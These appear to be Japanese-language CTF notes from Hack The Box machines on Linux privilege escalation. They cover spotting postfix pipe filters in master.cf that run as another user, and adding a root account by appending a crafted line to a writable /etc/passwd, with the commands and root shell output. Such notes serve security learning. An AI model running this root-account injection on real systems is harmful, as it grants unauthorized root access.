# linux
----
## Run As
* rootで動作しているデーモンは、setuid関数およびexecuve関数で任意のユーザの子プロセスを生成しうる
* 例えばそのようなデーモンにcronや、postfixがある。
* postfixの場合、常駐しているプロセスはrootで動作するmasterプロセスおよび、postfixで動作する子プロセスである
* しかし、メール送信をトリガとして、rootでもpostfixでもない、第三者のユーザの子プロセスが生成される可能性がある
* メール送信などをトリガとして第三者のユーザの子プロセスが生成される場合、psなどのプロセス監視では前記第三者のユーザの子プロセスを見逃す懸念が高いため、コンフィグファイルをチェックする必要がある
  ```console
  kyle@writer:/etc/postfix$ ps aux | grep postfix
  root        2750  0.0  0.1  38036  4596 ?        Ss   Aug02   0:00 /usr/lib/postfix/sbin/master -w
  postfix     2752  0.0  0.1  38500  6100 ?        S    Aug02   0:00 qmgr -l -t unix -u
  postfix     2757  0.0  0.2  42100  9200 ?        S    Aug02   0:00 tlsmgr -l -t unix -u -c
  postfix   282071  0.0  0.1  38304  6168 ?        S    10:36   0:00 pickup -l -t unix -u -c
  kyle      282201  0.0  0.0   8160  2416 pts/1    R+   10:39   0:00 grep --color=auto postfix
  
  kyle@writer:/etc/postfix$ cat master.cf | grep -v '#'
  smtp      inet  n       -       y       -       -       smtpd -o content_filter=dfilt:
  
  pickup    unix  n       -       y       60      1       pickup
  cleanup   unix  n       -       y       -       0       cleanup
  qmgr      unix  n       -       n       300     1       qmgr
  tlsmgr    unix  -       -       y       1000?   1       tlsmgr
  rewrite   unix  -       -       y       -       -       trivial-rewrite
  bounce    unix  -       -       y       -       0       bounce
  defer     unix  -       -       y       -       0       bounce
  trace     unix  -       -       y       -       0       bounce
  verify    unix  -       -       y       -       1       verify
  flush     unix  n       -       y       1000?   0       flush
  proxymap  unix  -       -       n       -       -       proxymap
  proxywrite unix -       -       n       -       1       proxymap
  smtp      unix  -       -       y       -       -       smtp
  relay     unix  -       -       y       -       -       smtp
          -o syslog_name=postfix/$service_name
  showq     unix  n       -       y       -       -       showq
  error     unix  -       -       y       -       -       error
  retry     unix  -       -       y       -       -       error
  discard   unix  -       -       y       -       -       discard
  local     unix  -       n       n       -       -       local
  virtual   unix  -       n       n       -       -       virtual
  lmtp      unix  -       -       y       -       -       lmtp
  anvil     unix  -       -       y       -       1       anvil
  scache    unix  -       -       y       -       1       scache
  postlog   unix-dgram n  -       n       -       1       postlogd
  maildrop  unix  -       n       n       -       -       pipe
    flags=DRhu user=vmail argv=/usr/bin/maildrop -d ${recipient}
  uucp      unix  -       n       n       -       -       pipe
    flags=Fqhu user=uucp argv=uux -r -n -z -a$sender - $nexthop!rmail ($recipient)
  ifmail    unix  -       n       n       -       -       pipe
    flags=F user=ftn argv=/usr/lib/ifmail/ifmail -r $nexthop ($recipient)
  bsmtp     unix  -       n       n       -       -       pipe
    flags=Fq. user=bsmtp argv=/usr/lib/bsmtp/bsmtp -t$nexthop -f$sender $recipient
  scalemail-backend unix  -       n       n       -       2       pipe
    flags=R user=scalemail argv=/usr/lib/scalemail/bin/scalemail-store ${nexthop} ${user} ${extension}
  mailman   unix  -       n       n       -       -       pipe
    flags=FR user=list argv=/usr/lib/mailman/bin/postfix-to-mailman.py
    ${nexthop} ${user}
  dfilt     unix  -       n       n       -       -       pipe
    flags=Rq user=john argv=/etc/postfix/disclaimer -f ${sender} -- ${recipient}
  ```

## passwd
* Htb: Apocalyst
  ``` console
  falaraki@apocalyst:~$ openssl passwd -1 -salt salt password
  $1$salt$qJH7.N4xYta3aEG/dfqo/0
  falaraki@apocalyst:~$ echo 'test:$1$salt$qJH7.N4xYta3aEG/dfqo/0:0:0:root:root:/bin/bash' >> /etc/passwd
  falaraki@apocalyst:~$ su - test
  Password:
  No directory, logging in with HOME=/
  root@apocalyst:/root# id
  uid=0(root) gid=0(root) groups=0(root)
  ```
